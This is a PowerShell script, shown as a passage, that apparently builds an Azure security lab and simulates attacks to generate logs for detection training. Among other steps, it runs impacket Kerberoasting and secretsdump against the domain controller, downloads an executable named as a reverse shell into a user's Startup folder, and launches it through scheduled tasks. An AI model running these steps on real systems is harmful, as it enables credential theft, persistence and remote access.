& auditpol.exe /set /subcategory:"Process Creation" /success:enable /failure:enable

# Privilege use
& auditpol.exe /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable

Write-Output "Enabling scriptblock logging..."
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -force
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1 -Type DWord

gpupdate /force

Write-Output "Adding users to Local Admins..."
net localgroup Administrators "ODOMAIN\candice.kevin" /add
net localgroup Administrators "ODOMAIN\ssupport" /add

Write-Output "Creating scheduled tasks to simulate logons..."
schtasks /create /tn "RunCMD" /tr "cmd.exe /c echo hi " /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "$adminPassword"
schtasks /run /tn "RunCMD"
schtasks /create /tn "RunCMD2" /tr "cmd.exe /c echo hi " /sc ONCE /st 23:59 /ru "ODOMAIN\ssupport" /rp "$adminPassword"
schtasks /run /tn "RunCMD2"
"@
$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName "win10" -CommandId "RunPowerShellScript" -ScriptString $w10script 

# View the full output
$output.Value | ForEach-Object { $_.Message }




# LDAP Simple Bind and Kerberosting attack sim
# Python script to execute on the Linux VM 
$PythonScript = @"
from ldap3 import Server, Connection, ALL, SIMPLE

def connect_to_ad(server_address, user, password):
    server = Server(server_address, get_info=ALL)
    try:
        conn = Connection(
            server,
            user=user,
            password=password,
            authentication=SIMPLE,
            auto_bind=True
        )
        if conn.bind():
            print(f\"Successfully connected as {user}\")
        else:
            print(f\"Failed to bind: {conn.result}\")
    except Exception as e:
        print(f\"An error occurred: {e}\")
    finally:
        if conn:
            conn.unbind()

AD_SERVER = 'ldap://10.0.0.4'
AD_USER1 = 'ODOMAIN\\\\$LDAPUserAccount1'
AD_USER2 = 'ODOMAIN\\\\$LDAPUserAccount2'
AD_PASSWORD = '$adminPassword'

connect_to_ad(AD_SERVER, AD_USER1, AD_PASSWORD)
connect_to_ad(AD_SERVER, AD_USER2, AD_PASSWORD)
"@

#Write-Output $PythonScript

# Bash command to create and run the Python script
$Command = @"
#!/bin/bash
export DEBIAN_FRONTEND=noninteractive
sudo apt-get update -y
sudo apt-get install -y python3-pip python3-venv
python3 -m pip install --user pipx
python3 -m pipx ensurepath
export PATH="`$PATH`:`$HOME/.local/bin"
python3 -m pipx install impacket
pip3 install ldap3
echo "$PythonScript" > /tmp/temp_script.py
python3 /tmp/temp_script.py
sudo /root/.local/bin/GetUserSPNs.py -dc-ip 10.0.0.4 odomain.local/candice.kevin:'$adminPassword' -request
sudo /root/.local/bin/secretsdump.py 'ODOMAIN/ssupport:$adminPassword'@10.0.0.5
unset DEBIAN_FRONTEND 
"@


# Execute the command on the Linux VM
Write-Output "Executing script on the Linux VM web01..."
try {
    $result = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName `
                                    -VMName $web01Name `
                                    -CommandId "RunShellScript" `
                                    -ScriptString $Command

    if ($result) {
        Write-Output "Command executed successfully. Output:"
        $result.Value[0].Message | Write-Output
    } else {
        Write-Output "Command execution failed or returned no output."
    }
} catch {
    Write-Error "Failed to execute command: $_"
}




#Acess DC file share under an account with NTLMv1
$mservscript = @"
`$FileSharePath = "\\10.0.0.4\HealthReports"
`$securePassword = ConvertTo-SecureString "$adminPassword" -AsPlainText -Force
`$Credential = New-Object System.Management.Automation.PSCredential ("odomain\da-batch", `$securePassword)


# Directly access the file share with the specified credentials
`$session = New-PSDrive -Name TempShare -PSProvider FileSystem -Root `$FileSharePath -Credential `$Credential
try {
    Get-ChildItem -Path "TempShare:\"
} finally {
    Remove-PSDrive -Name TempShare
}

#Start-Process powershell.exe -Credential `$Credential -ArgumentList "-Command Get-ChildItem -Path `$FileSharePath; Start-Sleep -Seconds 1;Exit"
Write-Output "Accessed a folder under da-batch account, with downgraded NTLM."



# Create the service using sc.exe
`$command = "sc.exe create BackupSVC binPath= c:\backup\backup.exe obj= odomain\da-batch password= $adminPassword start= auto"
Invoke-Expression `$command


# Define the service account
`$AccountName = "odomain\da-batch"  

# Get the SID of the account
`$accountSID = (New-Object System.Security.Principal.NTAccount(`$AccountName)).Translate([System.Security.Principal.SecurityIdentifier]).Value

# Export the current security policy
`$SecEditFile = "`$env:temp\secpol.cfg"
secedit /export /cfg `$SecEditFile | Out-Null

# Read the exported security policy
`$config = Get-Content `$SecEditFile

# Check if the SID is already listed
if (`$config -match "SeServiceLogonRight\s*=\s*(.*`$accountSID.*)") {
    Write-Host "`$AccountName already has 'Log on as a service' rights."
    sc start BackupSVC
} else {
    # Append the SID to the existing list
    `$updatedConfig = `$config -replace "(SeServiceLogonRight\s*=\s*)(.*)", "```$1```$2,*`$accountSID"
    Set-Content `$SecEditFile `$updatedConfig

    # Apply the updated police
    secedit /configure /db secedit.sdb /cfg `$SecEditFile /areas USER_RIGHTS

    Write-Host "Granted 'Log on as a service' rights to `$AccountName."
    gpupdate /force
    sc.exe start backupsvc
}

# Clean up temporary files
Remove-Item `$SecEditFile -Force

"@
# Connect with NTLMv1
$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName "mserv" -CommandId "RunPowerShellScript" -ScriptString $mservscript 

# View the full output
$output.Value | ForEach-Object { $_.Message }



# Simulate user logon and initial access
$CandiceUserName = "ODOMAIN\candice.kevin"

$w10script=@"
`$DownloadUrl = "https://github.com/secpfe/FundyLabs/raw/refs/heads/main/rs.exe"
`$ExeName     = "rs.exe"
`$UserName    = "$CandiceUserName"
`$Password    = "$adminPassword"


# Drop a small PowerShell script on disk (C:\Temp\DownloadStartup.ps1)

`$downloadScript = `@"
param(
    [string]```$DownloadUrl,
    [string]```$ExeName
)
Write-Output "Downloading from ```$DownloadUrl..."

# Startup folder for the *current* user 
```$startupFolder = Join-Path ```$env:USERPROFILE "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
if (!(Test-Path ```$startupFolder)) {
    New-Item -ItemType Directory -Path ```$startupFolder -Force | Out-Null
}

```$destination = Join-Path ```$startupFolder ```$ExeName
Invoke-WebRequest -Uri ```$DownloadUrl -OutFile ```$destination

Write-Output "Downloaded to ```$destination"
"`@

# Create a temp directory if needed
if (!(Test-Path "C:\Temp")) {
    New-Item -ItemType Directory -Path "C:\Temp" | Out-Null
}

# Write the download script to disk
`$downloadScriptPath = "C:\Temp\DownloadStartup.ps1"
Set-Content -Path `$downloadScriptPath -Value `$downloadScript -Force -Encoding UTF8

# -----------------------
# STEP 1: Add P/Invoke definitions
# -----------------------
Add-Type -TypeDefinition `@"
using System;
using System.Text;
using System.Runtime.InteropServices;

public class NativeMethods {
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LogonUser(
        string lpszUsername,
        string lpszDomain,
        string lpszPassword,
        int dwLogonType,
        int dwLogonProvider,
        out IntPtr phToken);

    [DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    public static extern bool CloseHandle(IntPtr handle);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CreateProcessAsUser(
        IntPtr hToken,
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        int dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    // Logon types
    public const int LOGON32_LOGON_INTERACTIVE = 2;
    public const int LOGON32_PROVIDER_DEFAULT  = 0;
}
"`@

# -----------------------
# STEP 2: LogonUser (Interactive)
# -----------------------
Write-Host "`n[+] Attempting interactive logon for user: `$UserName"

`$domain = ""
`$user   = `$UserName
if (`$UserName -like "*\*") {
    `$domain = `$UserName.Split("\")[0]
    `$user   = `$UserName.Split("\")[1]
}

[IntPtr]`$userToken = [IntPtr]::Zero
`$logonOk = [NativeMethods]::LogonUser(
    `$user,
    `$domain,
    `$Password,
    [NativeMethods]::LOGON32_LOGON_INTERACTIVE,
    [NativeMethods]::LOGON32_PROVIDER_DEFAULT,
    [ref] `$userToken
)

if (!`$logonOk) {
    `$err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    throw "LogonUser (interactive) failed. Win32 error: `$err"
}

Write-Output "[+] LogonUser succeeded. We have an interactive token for `$UserName."

# -----------------------------------------------------------
# STEP 3: Use a Scheduled Task to simulate download
# -----------------------------------------------------------

Write-Output "`n[+] Creating a scheduled task to run DownloadStartup.ps1 as `$UserName..."
schtasks /create /tn "RunDownload" /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Temp\DownloadStartup.ps1 -DownloadUrl `$DownloadUrl -ExeName `$ExeName" /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "`$Password"  /RL HIGHEST  /F 
schtasks /run /tn "RunDownload"

Write-Output "`n[+] Done. There should be Event Log for a Type 2 logon, and the exe file should be placed in candice.kevin's Startup folder."
"@


$output = Invoke-AzVMRunCommand -ResourceGroupName "ITOperations" -VMName "win10" -CommandId "RunPowerShellScript" -ScriptString $w10script
$output.Value | ForEach-Object { $_.Message }



# Simulate Support PersonnelLogon
$SupportUserName = "ODOMAIN\ssupport"

$w10script2=@"
`$UserName    = "$SupportUserName"
`$Password    = "$adminPassword"


Write-Output "[+] Emulating RS running under candice..."
schtasks /create /tn "RunReverseShell" /tr "'C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rs.exe'" /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "`$Password"  /RL HIGHEST  /F 

`$Path = "C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rs.exe"
`$task = Get-ScheduledTask -TaskName "RunReverseShell"
`$newAction = New-ScheduledTaskAction -Execute `$Path 
Set-ScheduledTask -TaskName "RunReverseShell" -Action `$newAction -Trigger `$task.Triggers -User 'ODOMAIN\candice.kevin' -Password `$Password

Start-ScheduledTask -TaskName "RunReverseShell"
schtasks /run /tn "RunReverseShell"

# attempt 2
Write-Output "[+] Attempt 2: Emulating RS running under candice..."
`$action2 = New-ScheduledTaskAction  -Execute rs.exe  -WorkingDirectory `$Path
Register-ScheduledTask -TaskName "RShell2" -Action `$action2 -User "ODOMAIN\candice.kevin" -Password `$Password.
start-sleep 2
Start-ScheduledTask -TaskName "RShell2"

Write-Output "`n[+] There should be 4688 events for rs.exe."


# -----------------------
# STEP 1: Add P/Invoke definitions
# -----------------------
Add-Type -TypeDefinition `@"
using System;
using System.Text;
using System.Runtime.InteropServices;

public class NativeMethods {
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LogonUser(
        string lpszUsername,
        string lpszDomain,
        string lpszPassword,
        int dwLogonType,
        int dwLogonProvider,
        out IntPtr phToken);

    [DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    public static extern bool CloseHandle(IntPtr handle);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CreateProcessAsUser(
        IntPtr hToken,
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        int dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    // Logon types
    public const int LOGON32_LOGON_INTERACTIVE = 2;
    public const int LOGON32_PROVIDER_DEFAULT  = 0;
}
"`@

# -----------------------
# STEP 1: LogonUser (Interactive) for ssupport
# -----------------------
Write-Host "`n[+] Attempting interactive logon for user: `$UserName"

`$domain = ""
`$user   = `$UserName
if (`$UserName -like "*\*") {
    `$domain = `$UserName.Split("\")[0]
    `$user   = `$UserName.Split("\")[1]
}

[IntPtr]`$userToken = [IntPtr]::Zero
`$logonOk = [NativeMethods]::LogonUser(
    `$user,
    `$domain,
    `$Password,
    [NativeMethods]::LOGON32_LOGON_INTERACTIVE,
    [NativeMethods]::LOGON32_PROVIDER_DEFAULT,
    [ref] `$userToken
)

if (!`$logonOk) {
    `$err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    throw "LogonUser (interactive) failed. Win32 error: `$err"
}

Write-Output "[+] LogonUser succeeded. We have an interactive token for `$UserName."
Write-Output "`n[+] There should be Event Log for a Type 2 logon for `$UserName."
"@


$output = Invoke-AzVMRunCommand -ResourceGroupName "ITOperations" -VMName "win10" -CommandId "RunPowerShellScript" -ScriptString $w10script2
$output.Value | ForEach-Object { $_.Message }
